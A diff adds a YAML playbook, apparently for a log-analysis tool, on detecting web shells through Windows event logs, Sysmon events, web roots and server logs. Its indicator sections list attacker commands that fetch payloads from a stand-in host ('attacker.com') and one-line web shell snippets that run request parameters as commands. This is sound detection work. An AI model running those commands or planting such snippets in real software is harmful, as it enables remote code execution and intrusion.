@@ -1,0 +1,221 @@
+name: web_shells
+description: Investigation strategies for detecting web shells - malicious scripts uploaded to web servers for remote access and command execution
+
+playbook: |
+  ## WEB SHELL INVESTIGATION PLAYBOOK
+  
+  ### What are Web Shells?
+  Malicious scripts (PHP, ASPX, JSP, etc.) uploaded to web servers that provide remote command execution and file management capabilities.
+  
+  ### Key Indicators to Investigate:
+  
+  1. **Web Server Process Spawning Commands (Sysmon 1, Event ID 4688)**
+     - Web servers should NOT spawn cmd.exe, powershell.exe
+     - Parent processes: w3wp.exe (IIS), httpd.exe (Apache), nginx.exe, java.exe (Tomcat)
+     - Fields: EventData.ParentProcessName, EventData.NewProcessName, EventData.CommandLine
+     - Query: `query_jsonb_field` with jsonb_path='EventData.ParentProcessName', operator='ILIKE', value='%w3wp%'
+     - Red flags: w3wp.exe → cmd.exe, powershell.exe, net.exe, whoami.exe
+  
+  2. **Suspicious File Creation in Web Roots (Sysmon 11)**
+     - Web shells uploaded to web-accessible directories
+     - Common paths:
+       - IIS: C:\inetpub\wwwroot\
+       - Apache: /var/www/html/, C:\Apache\htdocs\
+       - Tomcat: C:\Program Files\Apache Software Foundation\Tomcat\webapps\
+     - Fields: EventData.TargetFilename, EventData.Image
+     - Query: `search_events_by_content` for 'inetpub\\wwwroot', 'wwwroot'
+     - File types: .aspx, .php, .jsp, .asp, .cfm
+     - Red flags: Unexpected files in web roots, suspicious filenames (shell.aspx, cmd.php)
+  
+  3. **Web Server Network Connections (Sysmon 3)**
+     - Web shells making outbound connections (reverse shells, C2)
+     - Fields: EventData.Image, EventData.DestinationIp, EventData.DestinationPort
+     - Query: `query_jsonb_field` with jsonb_path='EventData.Image', operator='ILIKE', value='%w3wp%'
+     - Filter: DestinationPort NOT 80/443 (unusual ports)
+     - Red flags: Web server connecting to external IPs on non-HTTP ports
+  
+  4. **Web Application Exploitation (IIS Logs, Event ID 4663)**
+     - File uploads, path traversal, code injection
+     - IIS logs: POST requests to upload endpoints
+     - Event 4663: File access by web server process
+     - Query: `search_events_by_content` for 'POST', 'upload', 'file'
+     - Red flags: Large POST requests, unusual file extensions, path traversal (../)
+  
+  5. **Common Web Shell Artifacts (Sysmon 11)**
+     - Known web shell filenames and patterns
+     - Filenames: shell.aspx, cmd.php, webshell.jsp, c99.php, r57.php, b374k.php
+     - Query: `search_events_by_content` for 'shell.aspx', 'cmd.php', 'webshell'
+     - Content patterns: eval(), base64_decode(), exec(), system(), passthru()
+     - Red flags: Files with obfuscated code, eval chains
+  
+  6. **Web Server File Modifications (Sysmon 11)**
+     - Modifying existing web files to include backdoors
+     - Target files: index.aspx, default.aspx, login.php
+     - Fields: EventData.TargetFilename, EventData.Image
+     - Query: `search_events_by_content` for web root paths
+     - Red flags: Unexpected modifications to core web files
+  
+  7. **Authentication Bypass (Event ID 4624, 4625)**
+     - Web shells may bypass normal authentication
+     - Look for: Web server process accessing resources without user logon
+     - Fields: EventData.LogonType, EventData.ProcessName
+     - Query: event_type='evtx_security_4624' with ProcessName='w3wp.exe'
+     - Red flags: Web server accessing files with SYSTEM or unusual accounts
+  
+  8. **Web Server Error Logs**
+     - Errors from web shell execution attempts
+     - IIS: C:\inetpub\logs\LogFiles\
+     - Apache: /var/log/apache2/error.log
+     - Look for: 500 errors, parsing errors, execution errors
+     - Red flags: Errors related to shell commands, eval(), exec()
+  
+  9. **Encoded/Obfuscated Requests**
+     - Web shells often use encoding to hide commands
+     - Patterns: Base64, URL encoding, hex encoding
+     - Query: Check IIS logs or Event 4663 for encoded parameters
+     - Red flags: Long encoded strings in POST data, unusual character patterns
+  
+  10. **Persistence Mechanisms**
+     - Web shells creating scheduled tasks, services, registry keys
+     - Check for: Sysmon 13 (registry), Event 4698 (scheduled task), Event 7045 (service)
+     - Query: Correlate with web server process as parent
+     - Red flags: Web server process creating persistence
+  
+  ### Investigation Strategy:
+  
+  **Phase 1 - Identify Web Shell Activity**
+  - Query for web server processes spawning commands (w3wp.exe → cmd.exe)
+  - Check for file creation in web roots (Sysmon 11)
+  - Look for unusual web server network connections (Sysmon 3)
+  
+  **Phase 2 - Locate Web Shell Files**
+  - Search web root directories for suspicious files
+  - Check MFT for files created in web-accessible paths
+  - Identify upload timestamps and source IPs (IIS logs)
+  
+  **Phase 3 - Analyze Web Shell Capabilities**
+  - What commands were executed? (Check CommandLine field)
+  - What files were accessed? (Event 4663, Sysmon 11)
+  - What network connections were made? (Sysmon 3)
+  - Is there persistence? (Registry, tasks, services)
+  
+  **Phase 4 - Determine Initial Access**
+  - How was the web shell uploaded? (Vulnerability, file upload)
+  - When was it uploaded? (Timeline)
+  - What vulnerability was exploited? (IIS logs, Event 4663)
+  
+  ### Common Web Shell Attack Patterns:
+  
+  - **Upload → Execute**: Exploit file upload → Upload web shell → Execute commands
+  - **Modify Existing File**: Exploit vulnerability → Modify legitimate file → Add backdoor
+  - **Reverse Shell**: Web shell → Outbound connection → Interactive shell
+  - **Credential Harvesting**: Web shell → Dump credentials → Lateral movement
+  - **Pivot Point**: Web shell → Internal reconnaissance → Lateral movement
+  
+  ### Detection Queries:
+  
+  ```
+  # Find web server processes spawning commands
+  query_jsonb_field(jsonb_path='EventData.ParentProcessName', operator='ILIKE', value='%w3wp%',
+                    event_type='evtx_sysmon_1', description='IIS spawning processes')
+  query_jsonb_field(jsonb_path='EventData.ParentProcessName', operator='ILIKE', value='%httpd%',
+                    event_type='evtx_sysmon_1', description='Apache spawning processes')
+  
+  # Find files created in web roots
+  search_events_by_content(value='inetpub\\wwwroot', description='IIS web root file creation')
+  search_events_by_content(value='wwwroot', description='Web root file creation')
+  
+  # Find web server outbound connections
+  query_jsonb_field(jsonb_path='EventData.Image', operator='ILIKE', value='%w3wp%',
+                    event_type='evtx_sysmon_3', description='IIS network connections')
+  
+  # Find common web shell filenames
+  search_events_by_content(value='shell.aspx', description='Web shell file')
+  search_events_by_content(value='cmd.php', description='Web shell file')
+  search_events_by_content(value='webshell', description='Web shell file')
+  ```
+  
+  ### Web Shell File Extensions:
+  
+  - **ASP/ASPX**: IIS web servers (.asp, .aspx, .ashx, .asmx)
+  - **PHP**: Apache, nginx (.php, .php3, .php4, .php5, .phtml)
+  - **JSP**: Tomcat, JBoss (.jsp, .jspx)
+  - **CFM**: ColdFusion (.cfm, .cfml)
+  - **Perl**: Apache with mod_perl (.pl, .cgi)
+  
+  ### Common Web Shell Commands:
+  
+  ```
+  # Windows (ASPX web shells)
+  cmd.exe /c whoami
+  cmd.exe /c net user
+  cmd.exe /c net localgroup administrators
+  powershell.exe -EncodedCommand <base64>
+  
+  # Linux (PHP web shells)
+  /bin/sh -c whoami
+  /bin/bash -c id
+  /usr/bin/wget http://attacker.com/payload
+  /usr/bin/curl http://attacker.com/payload
+  ```
+  
+  ### Web Shell Indicators in Code:
+  
+  **PHP**:
+  ```php
+  eval($_POST['cmd']);
+  system($_GET['cmd']);
+  exec($_REQUEST['cmd']);
+  passthru($_POST['cmd']);
+  base64_decode(...)
+  ```
+  
+  **ASPX**:
+  ```csharp
+  Process.Start("cmd.exe", "/c " + Request["cmd"]);
+  Response.Write(ExecuteCommand(Request["cmd"]));
+  eval(Request["code"]);
+  ```
+  
+  **JSP**:
+  ```java
+  Runtime.getRuntime().exec(request.getParameter("cmd"));
+  ProcessBuilder pb = new ProcessBuilder(cmd);
+  ```
+  
+  ### Key Questions to Answer:
+  
+  1. Was a web shell uploaded? (File creation in web root)
+  2. What is the web shell filename and location?
+  3. When was it uploaded? (Timeline)
+  4. How was it uploaded? (Vulnerability, file upload exploit)
+  5. What commands were executed? (Process creation events)
+  6. What data was accessed or exfiltrated? (File access, network connections)
+  7. Is there persistence? (Scheduled tasks, services, additional backdoors)
+  8. What is the source IP? (IIS logs, Event 4663)
+  
+  ### Remediation:
+  
+  1. **Immediate**:
+     - Delete web shell files
+     - Restart web server (clear in-memory backdoors)
+     - Block source IP addresses
+  
+  2. **Investigation**:
+     - Identify vulnerability used for upload
+     - Check for additional web shells or backdoors
+     - Review IIS logs for attacker activity
+  
+  3. **Prevention**:
+     - Patch web application vulnerabilities
+     - Implement file upload restrictions (whitelist extensions, validate content)
+     - Enable web application firewall (WAF)
+     - Monitor web root directories for unauthorized changes
+     - Implement code integrity monitoring
+  
+  ### Advanced Detection:
+  
+  - **File Integrity Monitoring**: Alert on any changes to web root files
+  - **Behavioral Analysis**: Baseline normal web server behavior, alert on deviations
+  - **YARA Rules**: Scan web roots for known web shell signatures
+  - **Memory Analysis**: Detect in-memory web shells (fileless)
